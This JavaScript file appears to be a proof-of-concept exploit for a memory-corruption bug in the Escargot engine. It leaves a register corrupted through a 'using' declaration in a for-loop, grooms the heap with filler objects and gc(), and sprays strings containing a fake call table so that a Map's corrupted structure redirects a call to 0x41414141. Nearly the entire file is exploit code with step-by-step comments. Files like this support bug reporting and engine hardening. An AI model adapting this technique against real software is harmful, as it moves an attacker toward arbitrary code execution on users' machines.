let filler = [];
for (let i = 0; i < 600000; i++) {
    filler.push({ value: i });
}

const resource = {};

function disposeLikeMethod() {
    return disposeLikeMethod;
}

async function f(value) {
    // The condition replaces the register that cleanup later reads.
    for (using x = null; pass(value);) {
        break;
    }
}

function pass(value) {
    return value;
}

const map = new Map();
const neighbor = new Set([1, 2]);
map.set(resource, disposeLikeMethod);

// Allocate this Map's structure after the filler objects.
map.marker = 1;

// Keep the Map and release the objects below its structure.
filler = null;
gc();

// The corrupted Map structure lands at 0x2000190 in the tested build.
// Escargot reads a table address here, then a call target 16 bytes later.
const tableAddress = "\xa0\x01\x00\x02\x00\x00\x00\x00";
const jumpTarget = "\x41\x41\x41\x41\x00\x00\x00\x00";
const fakeCallTable =
    tableAddress +
    "\x00".repeat(24) +
    jumpTarget;

const strings = [];
for (let i = 0; i < 5000; i++) {
    // Fill the released memory with the table and target above.
    const text = fakeCallTable.repeat(100) + i;

    // Read one character so Escargot stores the complete string.
    text.charCodeAt(text.length - 1);
    strings.push(text);
}

f(map).then(() => {
    // The corrupted call tries to execute 0x41414141.
    print(map.length);
    print(neighbor.size);
    print(strings.length);
});
